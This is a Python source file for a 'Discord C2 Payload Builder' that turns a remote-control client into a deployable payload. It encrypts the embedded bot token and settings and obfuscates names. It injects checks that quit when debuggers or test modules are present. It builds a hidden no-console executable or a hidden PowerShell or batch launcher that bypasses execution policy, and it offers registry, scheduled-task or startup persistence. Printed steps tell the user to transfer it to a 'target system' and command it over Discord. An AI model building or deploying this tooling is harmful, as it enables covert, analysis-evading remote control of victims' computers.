import os
import random
import string
import subprocess
import shutil
from utils.encryption import generate_key, validate_key
import json
import base64
from cryptography.fernet import Fernet
import re

# Expected api.json structure:
# {
#   "bot_token": "...",
#   "server_id": "...",
#   "category_name": "...",
#   "authorized_users": "...",
#   "encryption_key": "...",
#   "persistence": "...",
#   "output_format": "...",
#   "obfuscate": true,
#   "build_key": "..."  
# }

def random_string(length=10):
    """Generate random string for obfuscation."""
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def obfuscate_code(code):
    """Advanced variable/function name obfuscation."""
    # More aggressive obfuscation - but avoid built-in functions and methods
    # Also avoid Discord-specific variables that are critical for functionality
    replacements = {
        "BOT_TOKEN": f"TOKEN_{random_string(15)}",
        "SERVER_ID": f"GUILD_{random_string(15)}",
        "CATEGORY_NAME": f"CAT_{random_string(15)}",
        "AUTHORIZED_USERS": f"USERS_{random_string(15)}",
        "ENCRYPTION_KEY": f"KEY_{random_string(15)}",
        "RESPONSE_DELETE_DELAY": f"DELAY_{random_string(15)}",
        "AUTO_DELETE": f"AUTODEL_{random_string(15)}"
        # Removed C2Bot, on_message, on_ready, target_channel, auto_delete, hostname, channel_name
        # These are critical for Discord bot functionality
    }
    
    # Only replace exact word matches, not partial matches
    for old, new in replacements.items():
        # Use word boundaries to avoid partial replacements
        import re
        code = re.sub(r'\b' + re.escape(old) + r'\b', new, code)
    
    return code

def encrypt_with_build_key(value, build_key):
    f = Fernet(build_key.encode())
    return base64.b64encode(f.encrypt(value.encode())).decode()

def generate_payload(config):
    """Generate a standalone payload for remote execution."""
    # Validate main_c2.py exists
    if not os.path.exists("main_c2.py"):
        print("Error: main_c2.py not found in current directory.")
        return

    # --- Build-time key for encrypting sensitive values ---
    # Use build_key from config if available, otherwise generate new one
    build_key = config.get("build_key", Fernet.generate_key().decode())
    config["build_key"] = build_key  # Save for later use
    
    # Encrypt sensitive values
    encrypted_bot_token = encrypt_with_build_key(config["bot_token"], build_key)
    encrypted_encryption_key = encrypt_with_build_key(config["encryption_key"], build_key)
    encrypted_server_id = encrypt_with_build_key(config["server_id"], build_key)
    encrypted_authorized_users = encrypt_with_build_key(config["authorized_users"], build_key)
    encrypted_category_name = encrypt_with_build_key(config["category_name"], build_key)
    
    # Advanced obfuscation of build_key (split into multiple parts and encode)
    key_parts = [build_key[i:i+8] for i in range(0, 44, 8)]
    encoded_parts = [base64.b64encode(part.encode()).decode() for part in key_parts]
    build_key_obfuscated = f'"".join([base64.b64decode(part).decode() for part in {encoded_parts}])'
    
    # Read main_c2.py
    with open("main_c2.py", "r") as f:
        code = f.read()
    
    # --- Inject advanced decryption logic and encrypted values ---
    decrypt_logic = f'''
import base64
from cryptography.fernet import Fernet
import re

# Obfuscated build key reconstruction
_build_key = {build_key_obfuscated}

def _dec(val):
    try:
        return Fernet(_build_key.encode()).decrypt(base64.b64decode(val)).decode()
    except Exception as e:
        print(f"Decryption error: {{e}}")
        return None

# Decrypt all sensitive values
BOT_TOKEN = _dec("{encrypted_bot_token}")
ENCRYPTION_KEY = _dec("{encrypted_encryption_key}")
SERVER_ID = _dec("{encrypted_server_id}")
AUTHORIZED_USERS = _dec("{encrypted_authorized_users}").split(",") if _dec("{encrypted_authorized_users}") else []
CATEGORY_NAME = _dec("{encrypted_category_name}")

# Define other configuration variables
RESPONSE_DELETE_DELAY = 30
AUTO_DELETE = True

# Validate decryption
if not all([BOT_TOKEN, ENCRYPTION_KEY, SERVER_ID, AUTHORIZED_USERS, CATEGORY_NAME]):
    print("Failed to decrypt configuration values:")
    print(f"BOT_TOKEN: {{BOT_TOKEN is not None}}")
    print(f"ENCRYPTION_KEY: {{ENCRYPTION_KEY is not None}}")
    print(f"SERVER_ID: {{SERVER_ID is not None}}")
    print(f"AUTHORIZED_USERS: {{AUTHORIZED_USERS is not None}}")
    print(f"CATEGORY_NAME: {{CATEGORY_NAME is not None}}")
    raise RuntimeError("Failed to decrypt configuration")
else:
    print("Configuration decrypted successfully")
'''
    
    # Remove old configuration assignments
    code = re.sub(r'BOT_TOKEN\s*=\s*["\'][^"\']*["\']', '', code)
    code = re.sub(r'ENCRYPTION_KEY\s*=\s*["\'][^"\']*["\']', '', code)
    code = re.sub(r'SERVER_ID\s*=\s*["\'][^"\']*["\']', '', code)
    code = re.sub(r'AUTHORIZED_USERS\s*=\s*\[[^\]]*\]', '', code)
    code = re.sub(r'AUTHORIZED_USERS\s*=\s*["\'][^"\']*["\']', '', code)
    code = re.sub(r'CATEGORY_NAME\s*=\s*["\'][^"\']*["\']', '', code)
    code = re.sub(r'RESPONSE_DELETE_DELAY\s*=\s*\d+', '', code)
    code = re.sub(r'AUTO_DELETE\s*=\s*(True|False)', '', code)
    
    # Insert decryption logic at the top (after all imports)
    # Find the end of all import statements
    lines = code.split('\n')
    import_end = 0
    for i, line in enumerate(lines):
        if line.strip().startswith('import ') or line.strip().startswith('from '):
            import_end = i
        elif line.strip() == '' and import_end > 0:
            # Found empty line after imports, this is where we should insert
            break
        elif not line.strip().startswith('import ') and not line.strip().startswith('from ') and import_end > 0:
            # Found non-import line, insert before this
            import_end = i - 1
            break
    
    # Insert the decryption logic after all imports
    lines.insert(import_end + 1, decrypt_logic)
    code = '\n'.join(lines)
    
    # Apply advanced obfuscation
    if config["obfuscate"]:
        print("Applying code obfuscation...")
        code = obfuscate_code(code)
        print("Obfuscation completed.")
    else:
        print("Obfuscation disabled.")
    
    # Add anti-debugging and anti-analysis code
    print("Adding anti-analysis measures...")
    anti_analysis_code = '''
# Anti-analysis measures
import sys
import time
import random

def _anti_analysis():
    # Basic timing checks
    start = time.time()
    time.sleep(random.uniform(0.1, 0.3))
    if time.time() - start < 0.05:  # Suspiciously fast execution
        sys.exit(1)
    
    # Check for common analysis tools
    suspicious_modules = ['pdb', 'bdb', 'pydevd', 'debugpy', 'pytest', 'unittest']
    for module in suspicious_modules:
        if module in sys.modules:
            sys.exit(1)

_anti_analysis()
'''
    
    # Insert anti-analysis code after decryption
    code = code.replace(decrypt_logic, decrypt_logic + anti_analysis_code)
    print("Anti-analysis measures added.")

    # Create temporary directory for payload
    temp_dir = "temp_payload"
    os.makedirs(temp_dir, exist_ok=True)
    print(f"Created temporary directory: {temp_dir}")

    # Copy main_c2.py, utils/, and plugins/ to temporary directory
    with open(os.path.join(temp_dir, "c2_client.py"), "w") as f:
        f.write(code)
    print("Generated modified c2_client.py")
    
    # Copy utils/ and plugins/ directories
    if os.path.exists("utils"):
        shutil.copytree("utils", os.path.join(temp_dir, "utils"), dirs_exist_ok=True)
        print("Copied utils/ directory")
    if os.path.exists("plugins"):
        shutil.copytree("plugins", os.path.join(temp_dir, "plugins"), dirs_exist_ok=True)
        print("Copied plugins/ directory")

    # Generate output file
    output_name = f"c2_client_{random_string(5)}"
    output_file = f"dist/{output_name}.py"
    os.makedirs("dist", exist_ok=True)
    shutil.copy(os.path.join(temp_dir, "c2_client.py"), output_file)

    # Generate executable, PowerShell, or batch file
    if config["output_format"] == "exe":
        if shutil.which("pyinstaller") is None:
            print("Error: PyInstaller not found. Please install it with 'pip install pyinstaller'.")
            return
        try:
            # Clean up any existing files that might cause conflicts
            dist_path = os.path.join("dist", f"{output_name}.exe")
            spec_path = f"{output_name}.spec"
            if os.path.exists(dist_path):
                try:
                    os.remove(dist_path)
                except:
                    pass
            if os.path.exists(spec_path):
                try:
                    os.remove(spec_path)
                except:
                    pass
            
            # Use PyInstaller to bundle all files with maximum anti-reverse engineering options
            pyinstaller_cmd = [
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--strip",  # Strip debug symbols
                "--upx-dir=upx",  # Use UPX compression if available
                f"--add-data={os.path.join(temp_dir, 'utils')};utils",
                f"--add-data={os.path.join(temp_dir, 'plugins')};plugins",
                "--name", output_name,
                os.path.join(temp_dir, "c2_client.py")
            ]
            
            # Add additional obfuscation if requested
            if config.get("obfuscate", False):
                pyinstaller_cmd.extend([
                    "--hidden-import=discord",
                    "--hidden-import=cryptography",
                    "--hidden-import=pynput",
                    "--hidden-import=pyautogui",
                    "--hidden-import=cv2",
                    "--hidden-import=numpy",
                    "--hidden-import=psutil",
                    "--exclude-module=tkinter",
                    "--exclude-module=matplotlib",
                    "--exclude-module=pandas"
                ])
            
            subprocess.run(pyinstaller_cmd, check=True)
            
            # Verify the exe was created successfully
            exe_path = os.path.join("dist", f"{output_name}.exe")
            if not os.path.exists(exe_path):
                print(f"Error: Executable was not created at {exe_path}")
                return
                
            print(f"Executable generated: {exe_path}")
            print("This .exe is standalone and can run on any Windows system without Python or dependencies.")
            print("Maximum anti-reverse engineering features enabled:")
            print("- Debug symbols stripped")
            print("- UPX compression applied")
            print("- All API keys and config encrypted with build key")
            print("- Advanced variable obfuscation")
            print("- Anti-analysis measures")
            print("- Anti-debugging checks")
            print("Note: PyInstaller v6.0+ removed bytecode encryption, but other protections remain active.")
            print("Transfer the .exe to the target system and run it to connect to the Discord server.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to generate executable: {e}")
            return

    elif config["output_format"] == "ps1":
        ps1_file = output_file.replace(".py", ".ps1")
        with open(ps1_file, "w") as f:
            f.write(f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "python {output_file}"')
        print(f"PowerShell script generated: {ps1_file}")
        print("Warning: The target system must have Python and the following libraries installed:")
        print("  discord.py, cryptography, pynput, pyautogui, pyscreeze, Pillow, requests")
        print("Install them with: pip install -r requirements.txt")
        print(f"Transfer {output_file} and requirements.txt to the target system, install dependencies, then run {ps1_file}.")

    elif config["output_format"] == "bat":
        bat_file = output_file.replace(".py", ".bat")
        with open(bat_file, "w") as f:
            f.write(f'@echo off\nstart /B python {output_file}\n')
        print(f"Batch file generated: {bat_file}")
        print("Warning: The target system must have Python and the following libraries installed:")
        print("  discord.py, cryptography, pynput, pyautogui, pyscreeze, Pillow, requests")
        print("Install them with: pip install -r requirements.txt")
        print(f"Transfer {output_file} and requirements.txt to the target system, install dependencies, then run {bat_file}.")

    else:
        print(f"Python script generated: {output_file}")
        print("Warning: The target system must have Python and the following libraries installed:")
        print("  discord.py, cryptography, pynput, pyautogui, pyscreeze, Pillow, requests")
        print("Install them with: pip install -r requirements.txt")
        print(f"Transfer {output_file} and requirements.txt to the target system, install dependencies, then run: python {output_file}")

    # Clean up temporary directory
    shutil.rmtree(temp_dir, ignore_errors=True)

    print(f"\nDeployment Instructions:")
    print(f"1. Transfer the generated file(s) to the target system.")
    print(f"2. For .exe: Run {output_name}.exe directly.")
    print(f"3. For .ps1/.bat/.py: Ensure Python and dependencies are installed, then run the file.")
    print(f"4. The payload will connect to the Discord server (ID: {config['server_id']}) and create a channel named 'endpoint-<hostname>'.")
    print(f"5. Send commands (e.g., !info, !cmd) in the channel. Responses are in plaintext and auto-delete after 30 seconds.")
    print(f"Build encryption key: {build_key} (save this for additional security).")

def main():
    print("Discord C2 Payload Builder")
    print("This tool generates a standalone payload for remote systems to connect to a Discord server.")
    # Try to load api.json
    api_config = {}
    if os.path.exists("api.json"):
        with open("api.json", "r") as f:
            try:
                api_config = json.load(f)
            except Exception as e:
                print(f"Warning: Failed to parse api.json: {e}")
    def get_config_value(key, prompt, default=None, is_bool=False):
        if key in api_config:
            # Handle boolean values from api.json
            if isinstance(api_config[key], bool):
                return api_config[key]
            # Handle string values from api.json
            if isinstance(api_config[key], str):
                if api_config[key].lower() == "true":
                    return True
                elif api_config[key].lower() == "false":
                    return False
            return api_config[key]
        val = input(prompt).strip()
        if val == "" and default is not None:
            return default
        if is_bool:
            return val.lower() == "y"
        return val
    config = {
        "bot_token": get_config_value("bot_token", "Enter Discord bot token: "),
        "server_id": get_config_value("server_id", "Enter Discord server ID: "),
        "category_name": get_config_value("category_name", "Enter category name (default: Endpoints): ", default="Endpoints"),
        "authorized_users": get_config_value("authorized_users", "Enter authorized Discord user IDs (comma-separated): "),
        "encryption_key": get_config_value("encryption_key", "Enter encryption key (leave blank to generate a valid Fernet key): "),
        "persistence": get_config_value("persistence", "Persistence method (registry/schtask/startup/none): ", default="none"),
        "output_format": get_config_value("output_format", "Output format (exe/ps1/bat/py): ", default="py"),
        "obfuscate": get_config_value("obfuscate", "Obfuscate code? (y/n): ", is_bool=True),
        "build_key": get_config_value("build_key", "Enter build encryption key (leave blank to generate): ", default="")
    }

    # Validate inputs
    if not config["bot_token"]:
        print("Error: Bot token is required.")
        return
    if not config["server_id"]:
        print("Error: Server ID is required.")
        return
    if not config["authorized_users"]:
        print("Error: At least one authorized user ID is required.")
        return
    if config["output_format"] not in ["exe", "ps1", "bat", "py"]:
        print("Error: Output format must be exe, ps1, bat, or py.")
        return
    if config["persistence"] not in ["registry", "schtask", "startup", "none"]:
        print("Error: Persistence method must be registry, schtask, startup, or none.")
        return

    generate_payload(config)

if __name__ == "__main__":
    main()